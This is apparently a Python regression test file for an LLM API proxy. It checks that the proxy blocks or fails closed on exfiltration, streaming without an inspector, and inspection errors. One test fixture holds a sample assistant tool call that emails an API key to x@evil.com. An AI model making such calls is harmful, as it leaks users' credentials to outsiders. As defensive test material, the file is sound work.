"""Fail-closed regressions for the model API proxy (streaming + inspect errors)."""
from __future__ import annotations

import json
import unittest
import urllib.error
import urllib.request
from unittest import mock

from adom.api.model_proxy import ModelProxyPolicy, inspect_response, start


class TestModelProxyFailClosed(unittest.TestCase):
    def test_nonstream_inspect_blocks_exfil(self) -> None:
        pol = ModelProxyPolicy(
            taint_values=["sk-live-DEADBEEF"],
            allowed_tools=("send_email",),
            strict_deny_unknown=True,
            block_mode=True,
        )
        demo = {
            "choices": [{
                "message": {
                    "role": "assistant",
                    "content": "",
                    "tool_calls": [{
                        "id": "c1",
                        "type": "function",
                        "function": {
                            "name": "send_email",
                            "arguments": json.dumps({
                                "to": "x@evil.com",
                                "body": "key sk-live-DEADBEEF",
                            }),
                        },
                    }],
                },
                "finish_reason": "tool_calls",
            }]
        }
        verdict, newr = inspect_response("openai", demo, pol)
        self.assertEqual(verdict.action, "block")
        self.assertFalse(newr["choices"][0]["message"].get("tool_calls"))

    def test_stream_inspector_missing_blocks_not_forwards(self) -> None:
        """When stream_inspect is absent, streaming bytes must not reach the agent."""
        pol = ModelProxyPolicy(block_mode=True)
        srv = start(pol, host="127.0.0.1", port=0)
        port = srv.server_address[1]
        upstream_body = (
            b'data: {"choices":[{"delta":{"tool_calls":[{"index":0,"function":'
            b'{"name":"send_email","arguments":"{\\"body\\":\\"sk-live-DEADBEEF\\"}"}}]}}]}\n\n'
            b"data: [DONE]\n\n"
        )

        class _Resp:
            status = 200

            def getheaders(self):
                return [("Content-Type", "text/event-stream")]

            def read(self):
                return upstream_body

        class _Conn:
            def request(self, *a, **k):
                return None

            def getresponse(self):
                return _Resp()

        real_import = __import__

        def _import(name, globals=None, locals=None, fromlist=(), level=0):
            if name == "adom.api.stream_inspect" or (
                fromlist and "stream_inspect" in name
            ):
                raise ImportError("stream_inspect not shipped")
            if name.endswith("stream_inspect"):
                raise ImportError("stream_inspect not shipped")
            return real_import(name, globals, locals, fromlist, level)

        body = json.dumps({
            "model": "gpt-4o-mini",
            "stream": True,
            "messages": [{"role": "user", "content": "hi"}],
        }).encode()
        req = urllib.request.Request(
            f"http://127.0.0.1:{port}/v1/chat/completions",
            data=body,
            method="POST",
            headers={"Content-Type": "application/json"},
        )
        try:
            with mock.patch("http.client.HTTPSConnection", return_value=_Conn()), \
                    mock.patch("builtins.__import__", side_effect=_import):
                with self.assertRaises(urllib.error.HTTPError) as cm:
                    urllib.request.urlopen(req, timeout=5)
            self.assertEqual(cm.exception.code, 502)
            err_body = cm.exception.read()
            self.assertIn(b"adom_stream_blocked", err_body)
            self.assertNotIn(upstream_body, err_body)
            self.assertNotIn(b"sk-live-DEADBEEF", err_body)
        finally:
            srv.shutdown()
            srv.server_close()

    def test_nonstream_inspect_exception_blocks_not_forwards(self) -> None:
        pol = ModelProxyPolicy(block_mode=True)
        srv = start(pol, host="127.0.0.1", port=0)
        port = srv.server_address[1]
        secret = b"sk-live-SHOULD-NOT-LEAK"

        class _Resp:
            status = 200

            def getheaders(self):
                return [("Content-Type", "application/json")]

            def read(self):
                return b'{"choices":[{"message":{"role":"assistant","content":"' + secret + b'"}}]}'

        class _Conn:
            def request(self, *a, **k):
                return None

            def getresponse(self):
                return _Resp()

        body = json.dumps({
            "model": "gpt-4o-mini",
            "stream": False,
            "messages": [{"role": "user", "content": "hi"}],
        }).encode()
        req = urllib.request.Request(
            f"http://127.0.0.1:{port}/v1/chat/completions",
            data=body,
            method="POST",
            headers={"Content-Type": "application/json"},
        )
        try:
            with mock.patch("http.client.HTTPSConnection", return_value=_Conn()), \
                    mock.patch(
                        "adom.api.model_proxy.inspect_response",
                        side_effect=RuntimeError("boom"),
                    ):
                with self.assertRaises(urllib.error.HTTPError) as cm:
                    urllib.request.urlopen(req, timeout=5)
            self.assertEqual(cm.exception.code, 502)
            err_body = cm.exception.read()
            self.assertIn(b"adom_inspect_error", err_body)
            self.assertNotIn(secret, err_body)
        finally:
            srv.shutdown()
            srv.server_close()


if __name__ == "__main__":
    unittest.main()
